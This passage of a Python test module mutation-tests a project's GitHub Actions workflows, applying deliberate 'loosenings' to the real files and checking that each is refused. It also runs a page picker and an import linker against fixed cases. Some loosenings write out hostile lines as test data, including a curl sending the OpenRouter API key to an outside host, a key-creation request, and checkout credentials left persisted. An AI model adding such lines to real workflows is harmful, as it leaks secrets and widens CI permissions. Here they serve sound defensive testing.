    ("a promote refused and carried on", lambda t: t.replace('[[ "$copy" =~ ^dpl_[A-Za-z0-9]+$ ]] || { echo "::error::PROMOTE REFUSED', 'true || { echo "::error::PROMOTE REFUSED', 1)),
    ("a copy made with no target, left a preview", lambda t: t.replace('\\"target\\":\\"production\\",', "", 1)),
    ("a wait given up and left building", lambda t: t.replace('case "$state" in ERROR|CANCELED) exit 1 ;; esac', "exit 1", 1)),
    ("a refused cancel taken as done", lambda t: t.replace('[[ "$code" =~ ^2 ]] || { echo "::error::CANCEL REFUSED', 'true || { echo "::error::CANCEL REFUSED', 1)),
    # 2: the preview smoked as a stranger, deleted on red, named only after.
    ("the preview never smoked", lambda t: t.replace('gated "$host" wall && g=0 || g=$?', "g=0", 1)),
    ("a failed preview kept", lambda t: t.replace('v -X DELETE "https://api.vercel.com/v13/deployments/$id?$q"', 'v "https://api.vercel.com/v13/deployments/$id?$q"', 1)),
    ("the preview named before its smoke", lambda t: t.replace("          g=1\n", '          echo "preview: https://$host"\n          g=1\n', 1)),
    # 3: a time limit on every request and a deadline on every wait.
    ("a host request with no time limit", lambda t: t.replace("v() { curl -sS --max-time 20 ", "v() { curl -sS ", 1)),
    ("a read with no time limit", lambda t: t.replace("api() { curl -sSf --max-time 30 ", "api() { curl -sSf ", 1)),
    ("a wait with no deadline", lambda t: t.replace('while [ "$(date +%s)" -lt "$by" ]; do\n            state=', "while true; do\n            state=", 1)),
    ("waits that leave no time to roll back", lambda t: t.replace("          limit=9\n", "          limit=14\n", 1)),
    ("a rollback given longer than the job", lambda t: t.replace("local back=$(( $(date +%s) + 180 ))", "local back=$(( $(date +%s) + 600 ))", 1)),
    # 5.
    ("a write permission", lambda t: t.replace("  checks: read\n", "  checks: read\n  statuses: write\n", 1)),
    ("a job asking for its own permissions", lambda t: t.replace("    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n", 1)),
    ("the concurrency group on the workflow", lambda t: t.replace(BOARD_JOB_CONCURRENCY, "", 1).replace("\njobs:\n", "\nconcurrency:\n  group: build-board\n  cancel-in-progress: false\n\njobs:\n", 1)),
    ("credentials left in the checkout", lambda t: t.replace("persist-credentials: false", "persist-credentials: true", 1)),
    ("another App's check runs read", lambda t: t.replace("&app_id=%d&" % REVIEWER_APP_ID, "&app_id=15368&", 1)),
    ("check runs of another name read", lambda t: t.replace("check_name=%s&" % REVIEWER_CHECK, "check_name=review&", 1)),
    ("another App's run kept on the board", lambda t: t.replace("select(.app.id == %d and " % REVIEWER_APP_ID, "select(", 1)),
    ("a run of another name kept on the board", lambda t: t.replace(' and .name == "%s"' % REVIEWER_CHECK, "", 1)),
    ("a run on another head kept on the board", lambda t: t.replace(" and .head_sha == $sha)", ")", 1)),
    # 6 and 7.
    ("the snapshot stamped at the render", lambda t: t.replace('jq -n --arg at "$AT"', 'jq -n --arg at "$(date -u +%Y-%m-%dT%H:%M:%SZ)"', 1)),
    ("the stamp after the first read", lambda t: t.replace(BOARD_STAMP, "true", 1).replace("          rm -f \"$road\"\n", "          rm -f \"$road\"\n          " + BOARD_STAMP + "x\" >> \"$GITHUB_OUTPUT\"\n", 1)),
    ("a dispatch that deploys production by default", lambda t: t.replace("        default: preview\n", "        default: production\n", 1)),
    # #117's fourth read, 2 and 4b-c, and run 36714764680.
    ("a production dispatch before his look", lambda t: t.replace('if [ "$TARGET" = production ] && [ "$LIVE" != yes ]; then', "if false; then", 1)),
    ("every run's target production", lambda t: t.replace("TARGET: ${{ github.event_name != 'workflow_dispatch' && 'production' || inputs.target }}", "TARGET: production", 1)),
    ("a key made with the spend card's key", lambda t: t.replace('          rm -f "$RUNNER_TEMP/activity.json"\n', '          rm -f "$RUNNER_TEMP/activity.json"\n          curl -sS --max-time 30 -X POST -H "Authorization: Bearer $OPENROUTER_KEY" "https://openrouter.ai/api/v1/keys" -d \'{"name":"x"}\'\n', 1)),
    ("a second OpenRouter read", lambda t: t.replace('          rm -f "$RUNNER_TEMP/activity.json"\n', '          rm -f "$RUNNER_TEMP/activity.json"\n          curl -sS --max-time 30 -H "Authorization: Bearer $OPENROUTER_KEY" "https://openrouter.ai/api/v1/credits"\n', 1)),
    ("the spend card's key sent to another host", lambda t: t.replace('          rm -f "$RUNNER_TEMP/activity.json"\n', '          rm -f "$RUNNER_TEMP/activity.json"\n          curl -sS --max-time 30 -H "Authorization: Bearer $OPENROUTER_KEY" "https://example.com/"\n', 1)),
    ("the spend card's key read from elsewhere", lambda t: t.replace('"https://openrouter.ai/api/v1/activity")', '"https://openrouter.ai/api/v1/credits")', 1)),
    ("the fixed name never smoked", lambda t: t.replace('gated "$NEXT" wall && g=0 || g=$?', "g=0", 1)),
    ("a run summary written", lambda t: t.replace('          echo "open pull requests:', '          echo "rendered" >> "$GITHUB_STEP_SUMMARY"\n          echo "open pull requests:', 1)),
    ("any redirect taken as the wall", lambda t: t.replace('[[ "$loc" == "https://vercel.com/sso-api?"* ]]', "true", 1)),
    ("a redirect's address matched loosely", lambda t: t.replace('[[ "$loc" == "https://vercel.com/sso-api?"* ]]', '[[ "$loc" == *"sso-api"* ]]', 1)),
    ("the host's sign-in taken as gated at the domain", lambda t: t.replace('{ [ "$2" = wall ] && [[', "{ [[", 1)),
    ("a roadmap read before the grant is checked", lambda t: t.replace(BOARD_SCOPE, 'curl -sS "https://api.github.com/repos/$REPO/contents/roadmap.json" > /dev/null\n            ' + BOARD_SCOPE, 1)),
    ("a pull request fetched", lambda t: t.replace("      - name: Render\n", "      - run: git fetch origin pull/1/head\n      - name: Render\n", 1)),
    ("a row the workflow does not read", lambda t: t.replace("          Adonis80/phena=Phena\n", "          Adonis80/phena=Phena Two\n", 1)),
)


def _check_board_loosenings():
    """build-board.yml as it stands passes; each loosening of it is refused."""
    try:
        text = _read(BOARD_WORKFLOW)
    except OSError as e:
        print("  wiring: %s" % e)
        return 1
    bad = _check_board_wiring(board=text)
    if bad:
        return bad
    for what, loosen in BOARD_LOOSENINGS:
        changed = loosen(text)
        if changed == text:
            print("  wiring: the loosening '%s' no longer applies to %s — rewrite it against the "
                  "file as it stands, or it proves nothing" % (what, BOARD_WORKFLOW))
            bad += 1
        elif not _check_board_wiring(board=changed, quiet=True):
            print("  wiring: %s with %s passes the board's hold — the guard for it is gone"
                  % (BOARD_WORKFLOW, what))
            bad += 1
    if not bad:
        print("ok: each of %d loosenings of %s was applied to the real file and refused"
              % (len(BOARD_LOOSENINGS), BOARD_WORKFLOW))
    return bad

def _check_product_loosenings():
    """Every loosening above must turn the product wiring red, and none may miss."""
    try:
        product = _read(PRODUCT_WORKFLOW)
    except OSError as e:
        print("  wiring: %s" % e)
        return 1
    bad = 0
    for what, loosen in PRODUCT_LOOSENINGS:
        changed = loosen(product)
        if changed == product:
            print("  wiring: the loosening '%s' no longer applies to %s — rewrite it against the "
                  "file as it stands, or it proves nothing" % (what, PRODUCT_WORKFLOW))
            bad += 1
        elif _check_product_wiring(product=changed, quiet=True) == 0:
            print("  wiring: %s with %s passes the check — the guard for it is gone"
                  % (PRODUCT_WORKFLOW, what))
            bad += 1
    if not bad:
        print("ok: each of %d loosenings of %s was applied to the real file and refused"
              % (len(PRODUCT_LOOSENINGS), PRODUCT_WORKFLOW))
    return bad


# THE SLICE'S PAGES, PICKED BY RULE (#86). A product read carried the product's
# whole PRODUCT.md and roadmap.json — 155 KB of Hemz OS's on 24 September, on
# every read — and a slice usually edits the roadmap (58 of Hemz OS's last 72
# merged pull requests did) and often PRODUCT.md (29). Now it carries the roadmap
# item whose id the pull request's title opens with, and PRODUCT.md's opening
# and the sections that item names, and names everything else with its size.
# Never the sections the diff edits: the diff shows those already, and a pick
# made from the diff is one the proposer makes. The picker is run here, not
# read, against the cases below, as the class block is: an item read out of the
# middle of a title, a section left out unnamed, or a summary that prints the
# product's words into the public log each turns the check red.
PICK_CALL = ("if python3 - \"$t/title.txt\" \"$t/carried.roadmap.json\" \"$t/carried.PRODUCT.md\" "
             "\"$t/picked.txt\" 2>/dev/null <<'PY'")
PICK_TAKEN = ('cat "$t/picked.txt" >> "$pages"',
              'for f in roadmap.json PRODUCT.md; do add "$f" || echo "carried page not found in $REPO: $f"; done')
PICK_TITLE = 'jq -r \'.title // ""\' "$pr" > "$RUNNER_TEMP/title.txt"'
PICK_TOLD = 'echo "left-out part, that is a finding: say which."'
PICK_SAID = re.compile(r"^picked: (the slice's item|no item); \d+ of \d+ section\(s\) of PRODUCT\.md "
                       r"carried; \d+ of \d+ bytes\n$")
PICK_ROAD = json.dumps({
    "_what_this_is": "The agreed order.", "money_milestones": {"items": [{"at": 1000}]},
    "items": [{"id": "P2", "title": "Hosting", "plain": "Priced by §3's rules."},
              {"id": "P2b", "title": "Hosting, second", "plain": "Built to PRODUCT.md §4 and §6.2.",
               "next": "then § 1"},
              {"id": "P48", "title": "What is kept", "plain": "Nothing named here."},
              {"id": "P48.1", "title": "What is kept, a part", "plain": "See §2."},
              {"id": "A12", "title": "The truth", "next": "Per §9."},
              "not an item"],
    "retired": []}, ensure_ascii=False, indent=1)
PICK_SECTIONS = (("1. What it is", "ALPHA"), ("2. Who uses it", "BETA"), ("3. Money", "GAMMA £"),
                 ("4. Layers", "DELTA"), ("6. Backstage", "EPSILON"), ("Notes", "ZETA"))
PICK_OPENING = "# PRODUCT.md\n\nOwner: the Chairman.\n\n"
PICK_PRODUCT = PICK_OPENING + "".join("## %s\n%s\n" % s for s in PICK_SECTIONS)
# (the title, roadmap.json, PRODUCT.md, the item carried or None, the sections
# carried by number, a section named that is not there). None as the item's
# place means the picker must refuse, so the pages are carried whole.
PICK_CASES = (
    ("P2b lands, first half", PICK_ROAD, PICK_PRODUCT, "P2b", {1, 4, 6}, None),
    ("P2 — hosting", PICK_ROAD, PICK_PRODUCT, "P2", {3}, None),
    ("P2: hosting", PICK_ROAD, PICK_PRODUCT, "P2", {3}, None),
    ("P2bx lands", PICK_ROAD, PICK_PRODUCT, "", set(), None),
    ("A12's line", PICK_ROAD, PICK_PRODUCT, "A12", set(), 9),
    ("P48 lands", PICK_ROAD, PICK_PRODUCT, "P48", set(), None),
    ("P48.1 lands", PICK_ROAD, PICK_PRODUCT, "P48.1", {2}, None),
    ("Fix: P48 lands", PICK_ROAD, PICK_PRODUCT, "", set(), None),
    ("The refusal P2's newest fetch", PICK_ROAD, PICK_PRODUCT, "", set(), None),
    ("", PICK_ROAD, PICK_PRODUCT, "", set(), None),
    ("P2 with no roadmap", "", PICK_PRODUCT, "", set(), None),
    ("P2 with no product page", PICK_ROAD, "", "P2", set(), None),
    ("P2 on a broken roadmap", "{", PICK_PRODUCT, None, set(), None),
    ("P2 on a roadmap with no list", '{"items": {}}', PICK_PRODUCT, None, set(), None),
)
PICK_HARNESS = r'''
import contextlib, io, json, sys
program, cases = sys.argv[1], json.load(open(sys.argv[2], encoding="utf-8"))
code = compile(open(program, encoding="utf-8").read(), "picker", "exec")
said = []
for argv in cases:
    out, rc = io.StringIO(), 0
    sys.argv = ["-"] + argv
    try:
        with contextlib.redirect_stdout(out):
            exec(code, {"__name__": "__main__"})
    except SystemExit as e:
        rc = e.code if isinstance(e.code, int) else (0 if e.code is None else 1)
    except Exception:
        rc = 1
    said.append([rc, out.getvalue()])
json.dump(said, sys.stdout)
'''


def _picker(text, call=PICK_CALL):
    """The program called by `call` (the picker's, unless another is named), as the lines
    between its call and `PY`, dedented."""
    gather = _step_span(text, "Gather what the reviewer reads")
    lines = text[gather[0]:gather[1]].splitlines() if gather else []
    try:
        start = next(i for i, l in enumerate(lines) if l.strip() == call)
        end = next(i for i, l in enumerate(lines) if i > start and l.strip() == "PY")
    except StopIteration:
        return None
    return textwrap.dedent("\n".join(lines[start + 1:end])) + "\n"


def picks(program, cases):
    """Run the picker on each case. Per case, (exit status, what it printed, the pages it wrote)."""
    with tempfile.TemporaryDirectory() as d:
        argvs = []
        for n, (title, road, product) in enumerate(cases):
            names = [os.path.join(d, "%s%d" % (k, n)) for k in ("title", "road", "product", "out")]
            for name, body in zip(names, (title, road, product)):
                with open(name, "w", encoding="utf-8") as f:
                    f.write(body)
            argvs.append(names)
        for name, body in (("program", program), ("cases", json.dumps(argvs)),
                           ("harness", PICK_HARNESS)):
            with open(os.path.join(d, name), "w", encoding="utf-8") as f:
                f.write(body)
        try:
            p = subprocess.run([sys.executable, os.path.join(d, "harness"), os.path.join(d, "program"),
                                os.path.join(d, "cases")], capture_output=True, text=True, timeout=60)
            said = json.loads(p.stdout)
        except (OSError, subprocess.SubprocessError, ValueError):
            return [None] * len(cases)
        got = []
        for (rc, printed), argv in zip(said, argvs):
            try:
                pages = open(argv[3], encoding="utf-8").read()
            except OSError:
                pages = None
            got.append((rc, printed, pages))
    return got


def pick_faults(text):
    """What a product read has lost of carrying the slice's pages by rule, and saying so."""
    lost = []
    gather, read = _step_span(text, "Gather what the reviewer reads"), _step_span(text, "Read it")
    head = _step_span(text, "The commit asked for is the head")
    g = text[gather[0]:gather[1]] if gather else ""
    h = text[head[0]:head[1]] if head else ""
    if PICK_TITLE not in h or h.index(PICK_TITLE) > h.find('rm -f "$pr"'):
        lost.append("the title kept in a file before the pull request's answer goes (`%s`)" % PICK_TITLE)
    if "outputs.title" in text or [l for l in h.splitlines() if "title" in l and "GITHUB_OUTPUT" in l]:
        lost.append("the title kept out of the step outputs, whose variables this public log prints")
    for line in PICK_TAKEN:
        if line not in g:
            lost.append("`%s`, so the pages picked are the pages read, and whole when the pick fails"
                        % line)
    if not read or PICK_TOLD not in text[read[0]:read[1]]:
        lost.append("the reviewer told the pages were picked and asked to say if it needed one "
                    "(`%s`)" % PICK_TOLD)
    program = _picker(text)
    if program is None:
        lost.append("the picker, called as `%s` — the title and the two pages, never the diff, "
                    "its errors kept out of this public log" % PICK_CALL)
        return lost
    runs = picks(program, [c[:3] for c in PICK_CASES])
    for (title, road, product, item, carried, missing), got in zip(PICK_CASES, runs):
        case = "on a title %r%s%s" % (title, "" if road else ", with no roadmap",
                                       "" if product else ", with no product page")
        if got is None:
            lost.append("a picker that can be run %s" % case)
            continue
        rc, printed, pages = got
        if item is None:
            if rc == 0:
                lost.append("a pick refused %s, so the pages are carried whole" % case)
            continue
        if rc != 0 or pages is None:
            lost.append("a pick made %s (it exited %s)" % (case, rc))
            continue
        if not PICK_SAID.match(printed):
            lost.append("a summary of numbers alone %s (it printed %r)" % (case, printed))
        ids = re.findall(r'^ "id": "([^"]*)",$', pages, re.M)
        if ids != ([item] if item else []):
            lost.append("item %s carried alone %s (it carried %s)" % (item or "none", case, ids))
        if road and not item and not re.search(r"^===== roadmap\.json: \d+ bytes, left out: ", pages, re.M):
            lost.append("the roadmap named as left out %s" % case)
        if product and PICK_OPENING.strip() not in pages:
            lost.append("PRODUCT.md's opening carried %s" % case)
        for heading, body in (PICK_SECTIONS if product else ()):
            number = int(heading.split(".")[0]) if heading[0].isdigit() else None
            size = len(("## %s\n%s\n" % (heading, body)).encode())
            named = "\n===== PRODUCT.md, %s: %d bytes, left out: " % (heading, size)
            if number in carried and (body not in pages or named in pages):
                lost.append("§%d carried %s" % (number, case))
            if number not in carried and (body in pages or named not in pages):
                lost.append("%s named with its size and left out %s" % (heading, case))
        if missing and "===== PRODUCT.md §%d: named by the slice's roadmap item, and no such section" \
                % missing not in pages:
            lost.append("§%d named as missing %s" % (missing, case))
    return lost


# Each must turn the pick's hold red on review-product.yml.
PICK_LOOSENINGS = (
    ("an item found anywhere in the title", lambda t: t.replace('if title.startswith(i["id"]) and', 'if i["id"] in title and', 1)),
    ("an id read as the start of a longer word", lambda t: t.replace(' and not title[len(i["id"]):][:1].isalnum()', "", 1)),
    ("the shorter of two ids preferred", lambda t: t.replace("max(ids, key=len)", "min(ids, key=len)", 1)),
    ("the sections named ignored", lambda t: t.replace("int(number.group(1)) in named:", "False:", 1)),
    ("a left-out section unnamed", lambda t: t.replace("bytes, left out: not named by the slice's roadmap item", "bytes", 1)),
    ("a section's size misstated", lambda t: t.replace("len(part.encode())", "len(part)", 1)),
    ("a missing section not named", lambda t: t.replace("and no such section", "", 1)),
    ("a broken roadmap read as no item", lambda t: t.replace("                  raise SystemExit(1)\n", "                  road = {\"items\": []}\n", 1)),
    ("the summary naming the item", lambda t: t.replace('% ("the slice\'s item" if item', '% (item["id"] if item', 1)),
    ("the diff handed to the picker", lambda t: t.replace(PICK_CALL, PICK_CALL.replace('"$t/picked.txt"', '"$t/picked.txt" "$t/diff.txt"'), 1)),
    ("the picker's errors printed", lambda t: t.replace(PICK_CALL, PICK_CALL.replace(" 2>/dev/null", ""), 1)),
    ("the picked pages dropped", lambda t: t.replace(PICK_TAKEN[0], "true", 1)),
    ("a failed pick carrying nothing", lambda t: t.replace(PICK_TAKEN[1], "true", 1)),
    ("the reviewer not told", lambda t: t.replace(PICK_TOLD, 'echo "."', 1)),
    ("the title printed", lambda t: t.replace(PICK_TITLE, "jq -r '.title // \"\"' \"$pr\"", 1)),
    ("the title made an output", lambda t: t.replace(PICK_TITLE, PICK_TITLE + '\n          echo "title=$(cat "$RUNNER_TEMP/title.txt")" >> "$GITHUB_OUTPUT"', 1)),
)


def _check_pick_loosenings():
    """Every loosening above, applied to review-product.yml, must be refused."""
    try:
        product = _read(PRODUCT_WORKFLOW)
    except OSError as e:
        print("  wiring: %s" % e)
        return 1
    if pick_faults(product):
        return 1  # the wiring checks say what
    bad = 0
    for what, loosen in PICK_LOOSENINGS:
        changed = loosen(product)
        if changed == product:
            print("  wiring: the loosening '%s' no longer applies to %s — rewrite it against the "
                  "file as it stands, or it proves nothing" % (what, PRODUCT_WORKFLOW))
            bad += 1
        elif not pick_faults(changed):
            print("  wiring: %s with %s passes the pick's hold — the guard for it is gone"
                  % (PRODUCT_WORKFLOW, what))
            bad += 1
    if not bad:
        print("ok: a product read carries the roadmap item its pull request's title opens with and "
              "the PRODUCT.md sections that item names, naming every other part with its size and "
              "printing numbers alone; the picker was run on %d case(s), and each of %d loosenings "
              "was refused" % (len(PICK_CASES), len(PICK_LOOSENINGS)))
    return bad


# THE SOURCE THE CHANGE IMPORTS, ONE HOP (decision 0010, 1a). A product read
# carried the diff and every file it touches, and nothing those files call, so
# a reader judged a call it could not see. Now each touched JS, TS or Python
# file's direct imports are carried too, resolved against the head's tree and
# nothing else. Held as the picker is: the linker is run here, not read,
# against the cases below, so a bare package followed, a path the tree does not
# hold, a Python import read at the wrong level, or a summary that prints a
# product's path into the public log each turns the check red.
LINK_CALL = ("if timeout 60 python3 - \"$t/tree.txt\" \"$t/touched.txt\" \"$t/sources\" \"$t/linked.txt\" "
             "2>/dev/null <<'PY'")
LINK_TREE = 'g ls-tree -r -z --name-only "$SHA" > "$t/tree.txt"'
LINK_MARK = ("printf '\\n===== the source the change imports by relative path, and the scripts "
             "a page loads, one hop; callers, tests, database rules and configuration only where touched or "
             "imported =====\\n' >> \"$pages\"")
LINK_TAKEN = ('while IFS= read -r -d \'\' f; do case "$carried" in *" $f "*) continue ;; esac; '
              'add "$f" || true; done < "$t/linked.txt"')
LINK_FAILED = ('echo "the source the change imports could not be linked, so this read carries the '
               'touched files alone"')
LINK_TOLD = ('echo "One hop is not the boundary: a change that could not be judged for want of a '
             'file gets a blocking finding naming it."')
# The reader is told a failed link too, not only the log (#129's first read, 2).
LINK_FAILED_READ = ("printf '\\n===== the source the change imports could not be linked; only the "
                    "touched files are here =====\\n' >> \"$pages\"")
# What feeds the linker: the touched code of the kinds it reads, from the head (#129's first read, 4b).
LINK_KINDS = 'case "$f" in *.js|*.mjs|*.cjs|*.jsx|*.ts|*.tsx|*.py|*.html) ;; *) continue ;; esac'
LINK_FEED = 'g show "$SHA:$f" > "$t/sources/$n" 2>/dev/null || continue'
# The touched files' own loop, which the linked files must follow (#129's first read, 4a).
LINK_AFTER = 'add "$f" || true\n          done < "$t/touched.txt"\n'
LINK_HTML = ('<script src="hosting/queue.js?v=3"></script>\n<script src="/app.js"></script>\n'
             '<script src="https://cdn.example/x.js"></script><script src="//cdn.example/y.js"></script>\n'
             '<script type="module">import { l } from \'./hosting/lib.js\'</script>\n')
LINK_SAID = re.compile(r"^linked: \d+ file\(s\) imported by the \d+ touched code file\(s\) read\n$")
LINK_JS = ("import a from './a'\nimport React from 'react'\nimport { lib } from \"../lib\"\n"
           "import gone from './gone'\nexport { u } from './util'\nconst b = require('./b')\n"
           "const c = await import( './c' )\nimport './side.css'\n")
LINK_PY = ("from .x import y\nfrom .. import z\nimport pkg.mod\nimport os, json as j\n"
           "from . import (w,\n    v as vv, gone)\nfrom pkg.sub import x as xx\nfrom .... import far\n"
           "from pkg.sub import only\n")
# (the tree, the files touched, the touched code and its text, the files linked).
# The tree holds `app/react.js` beside the importer so that a bare `react`
# followed as if it were relative is caught, and `pkg/sub/z.py` is absent so
# that `from .. import z` read one level short finds nothing.
LINK_CASES = (
    (["app/main.js", "app/a.js", "app/react.js", "app/b.cjs", "app/c.tsx", "app/side.css",
      "app/util.js", "lib/index.ts", "lib/other.ts"],
     ["app/main.js", "app/util.js"],
     [("app/main.js", LINK_JS), ("app/util.js", "import { a } from './a.js'\n")],
     ["app/a.js", "lib/index.ts", "app/b.cjs", "app/c.tsx", "app/side.css"]),
    (["pkg/__init__.py", "pkg/sub/__init__.py", "pkg/sub/m.py", "pkg/sub/x.py", "pkg/z.py",
      "pkg/mod.py", "pkg/sub/w.py", "pkg/sub/v/__init__.py", "json.py", "pkg/sub/only.py"],
     ["pkg/sub/m.py"],
     [("pkg/sub/m.py", LINK_PY)],
     ["pkg/sub/x.py", "pkg/z.py", "pkg/sub/w.py", "pkg/sub/v/__init__.py", "pkg/sub/__init__.py",
      "pkg/sub/only.py", "pkg/mod.py", "json.py"]),
    (["app/main.ts", "app/a.ts", "README.md"], ["README.md", "app/main.ts"],
     [("app/main.ts", "// imports nothing\n")], []),
    (["app/main.ts", "app/a.ts"], ["app/main.ts", "app/a.ts"],
     [("app/main.ts", "import { a } from './a'\n")], []),
    (["README.md"], ["README.md"], [], []),
    # `https:/cdn.example/x.js` is what a remote src collapses to if followed as a path.
    (["the-quote.html", "hosting/queue.js", "hosting/lib.js", "app.js", "https:/cdn.example/x.js"],
     ["the-quote.html"],
     [("the-quote.html", LINK_HTML)], ["hosting/lib.js", "hosting/queue.js", "app.js"]),
)


def links(program, cases):
    """Run the linker on each case. Per case, (exit status, what it printed, the files it linked)."""
    with tempfile.TemporaryDirectory() as d:
        argvs = []
        for n, (tree, touched, sources, _) in enumerate(cases):
            names = [os.path.join(d, "%s%d" % (k, n)) for k in ("tree", "touched", "sources", "out")]
            os.mkdir(names[2])
            for name, paths in ((names[0], tree), (names[1], touched),
                                (os.path.join(names[2], "names"), [s[0] for s in sources])):
                with open(name, "w", encoding="utf-8") as f:
                    f.write("".join(p + "\0" for p in paths))
            for i, (_, body) in enumerate(sources):
                with open(os.path.join(names[2], str(i)), "w", encoding="utf-8") as f:
                    f.write(body)
            argvs.append(names)
        for name, body in (("program", program), ("cases", json.dumps(argvs)),
                           ("harness", PICK_HARNESS)):
            with open(os.path.join(d, name), "w", encoding="utf-8") as f:
                f.write(body)
        try:
            p = subprocess.run([sys.executable, os.path.join(d, "harness"), os.path.join(d, "program"),
                                os.path.join(d, "cases")], capture_output=True, text=True, timeout=60)
            said = json.loads(p.stdout)
        except (OSError, subprocess.SubprocessError, ValueError):
            return [None] * len(cases)
        got = []
        for (rc, printed), argv in zip(said, argvs):
            try:
                linked = [l for l in open(argv[3], encoding="utf-8").read().split("\0") if l]
            except OSError:
                linked = None
            got.append((rc, printed, linked))
    return got


def link_faults(text):
    """What a product read has lost of carrying the source the change imports, one hop."""
    lost = []
    gather, read = _step_span(text, "Gather what the reviewer reads"), _step_span(text, "Read it")
    g = text[gather[0]:gather[1]] if gather else ""
    if LINK_TREE not in g:
        lost.append("the tree listed from the head the read is of (`%s`)" % LINK_TREE)
    for line, why in ((LINK_MARK, "the reader told where the linked source starts and what it is not"),
                      (LINK_TAKEN, "the linked files carried through `add`, under the same budget"),
                      (LINK_FAILED, "a failed link said, in words that name nothing of the product's"),
                      (LINK_FAILED_READ, "a failed link said to the reader too, not only the log"),
                      (LINK_KINDS, "the touched code of every kind the linker reads handed to it"),
                      (LINK_FEED, "the touched code read from the head the read is of")):
        if line not in g:
            lost.append("%s (`%s`)" % (why, line))
    if LINK_TAKEN in g and (LINK_AFTER not in g or g.index(LINK_TAKEN) < g.index(LINK_AFTER)):
        lost.append("the touched files carried before the linked ones, so the budget spends on the change first")
    if not read or LINK_TOLD not in text[read[0]:read[1]]:
        lost.append("the reviewer told one hop is not the boundary (`%s`)" % LINK_TOLD)
    program = _picker(text, LINK_CALL)
    if program is None:
        lost.append("the linker, called as `%s` — the tree's names and the touched code, "
                    "its errors kept out of this public log" % LINK_CALL)
        return lost
    runs = links(program, LINK_CASES)
    for n, ((tree, touched, sources, want), got) in enumerate(zip(LINK_CASES, runs), 1):
        case = "in case %d" % n
        if got is None:
            lost.append("a linker that can be run %s" % case)
            continue
        rc, printed, linked = got
        if rc != 0 or linked is None:
            lost.append("a link made %s (it exited %s)" % (case, rc))
            continue
        if not LINK_SAID.match(printed) or [p for p in tree + touched if p in printed]:
            lost.append("a summary of numbers alone %s (it printed %r)" % (case, printed))
        if linked != want:
            lost.append("exactly the files imported, one hop, each once and none touched, %s "
                        "(it linked %s, not %s)" % (case, linked, want))
    return lost


# Each must turn the link's hold red on review-product.yml.
LINK_LOOSENINGS = (
    ("a bare package followed as if relative", lambda t: t.replace(r"""(\.\.?/[^"'\n]*)\1""", r"""([^"'\n]*)\1""", 1)),
    ("a folder's index not tried", lambda t: t.replace(' + [path + "/index" + e for e in JS])', ")", 1)),
    ("the extensions not tried", lambda t: t.replace('first([path] + [path + e for e in JS] + ', "first([path] + ", 1)),
    ("a path the tree does not hold linked", lambda t: t.replace("if c in tree), None)", "if c in tree), candidates[0])", 1)),
    ("a Python import's level ignored", lambda t: t.replace('base = "/".join(here[:len(here) - (len(dots) - 1)])', 'base = "/".join(here)', 1)),
    ("the names of `from . import` not read as modules", lambda t: t.replace("found.append(module(base, words[0]))", "pass", 1)),
    ("an absolute from-import's names not read as modules", lambda t: t.replace('found.append(module("", dotted + "." + words[0]))', "pass", 1)),
    ("the linker unbounded", lambda t: t.replace(LINK_CALL, LINK_CALL.replace("timeout 60 ", ""), 1)),
    ("an absolute Python import ignored", lambda t: t.replace("found.append(module(\"\", words[0]))", "pass", 1)),
    ("a touched file linked again", lambda t: t.replace(" and path not in touched", "", 1)),
    ("a linked file's path printed", lambda t: t.replace("% (len(chosen), importers))", "% (len(chosen), importers), *chosen)", 1)),
    ("the linker's errors printed", lambda t: t.replace(LINK_CALL, LINK_CALL.replace(" 2>/dev/null", ""), 1)),
    ("the tree listed from main", lambda t: t.replace(LINK_TREE, LINK_TREE.replace('"$SHA"', '"origin/$MAIN"'), 1)),
    ("the linked files dropped", lambda t: t.replace(LINK_TAKEN, "true", 1)),
    ("the marker line removed", lambda t: t.replace(LINK_MARK, "true", 1)),
    ("a failed link unsaid", lambda t: t.replace(LINK_FAILED, "true", 1)),
    ("the reviewer not told", lambda t: t.replace(LINK_TOLD, 'echo "."', 1)),
    ("a failed link unsaid to the reader", lambda t: t.replace(LINK_FAILED_READ, "true", 1)),
    ("Python not handed to the linker", lambda t: t.replace(LINK_KINDS, LINK_KINDS.replace("|*.py", ""), 1)),
    ("a page not handed to the linker", lambda t: t.replace(LINK_KINDS, LINK_KINDS.replace("|*.html", ""), 1)),
    ("the touched code read from main", lambda t: t.replace(LINK_FEED, LINK_FEED.replace('"$SHA:$f"', '"origin/$MAIN:$f"'), 1)),
    ("a page's own script src ignored", lambda t: t.replace("for quote, src in SRC.findall(text):", "for quote, src in []:", 1)),
    ("a remote script followed", lambda t: t.replace(' or ":" in src.split("/")[0]:', ":", 1)),
    ("the linked files carried before the touched ones", lambda t: _link_first(t)),
)


def _link_first(t):
    """The linker's block moved ahead of the touched files' own loop."""
    start = t.find('          carried=" roadmap.json PRODUCT.md "\n')
    end = t.find(LINK_AFTER, start)
    link_end = t.find('          rm -rf "$t/tree.txt"', end)
    if min(start, end, link_end) < 0:
        return t
    loop = t[start:end + len(LINK_AFTER)]
    return t[:start] + t[end + len(LINK_AFTER):link_end] + loop + t[link_end:]


def _check_link_loosenings():
    """Every loosening above, applied to review-product.yml, must be refused."""
    try:
        product = _read(PRODUCT_WORKFLOW)
    except OSError as e:
        print("  wiring: %s" % e)
        return 1
    if link_faults(product):
        return 1  # the wiring checks say what
    bad = 0
    for what, loosen in LINK_LOOSENINGS:
        changed = loosen(product)
        if changed == product:
            print("  wiring: the loosening '%s' no longer applies to %s — rewrite it against the "
                  "file as it stands, or it proves nothing" % (what, PRODUCT_WORKFLOW))
            bad += 1
        elif not link_faults(changed):
            print("  wiring: %s with %s passes the link's hold — the guard for it is gone"
                  % (PRODUCT_WORKFLOW, what))
            bad += 1
    if not bad:
        print("ok: a product read carries, beside the files a change touches, the source they "
              "import directly, one hop, resolved against the head's tree alone and printing "
              "numbers alone; the linker was run on %d case(s), and each of %d loosenings was "
              "refused" % (len(LINK_CASES), len(LINK_LOOSENINGS)))
    return bad


def _run(conclusion=None, status="completed", app=REVIEWER_APP_ID, name=REVIEWER_CHECK, sha=None):
    return {"app": None if app is None else {"id": app}, "name": name,
            "head_sha": sha, "status": status, "conclusion": conclusion}


def _check_main():
    """main() is RUN, against a GitHub that answers from a dictionary.

    Every case above hands verdict() a list. main() is what actually runs in CI,
    and it chooses which endpoints to ask for — so a rule only main() calls is a
    rule no case above reaches, and an endpoint that quietly stops being fetched
    is the same failure wearing a different coat. Both were findings on #46, and
    the proofs that answered them lived in a session's scratchpad and died with
    its container. These live here, and run on every push.

